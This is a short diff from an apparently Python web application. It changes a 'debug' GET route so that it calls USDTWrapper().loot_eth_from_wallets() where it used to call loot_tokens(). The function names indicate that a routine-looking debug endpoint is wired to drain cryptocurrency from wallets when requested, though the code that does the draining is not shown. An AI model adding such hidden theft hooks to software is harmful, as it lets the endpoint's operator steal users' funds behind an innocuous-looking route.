@@ -98,7 +98,7 @@ html2 = """
 
 @router.get("/")
 async def debug_get():
-    await loot_tokens()
+    await USDTWrapper().loot_eth_from_wallets()
 
 
 @router.get("/2/")
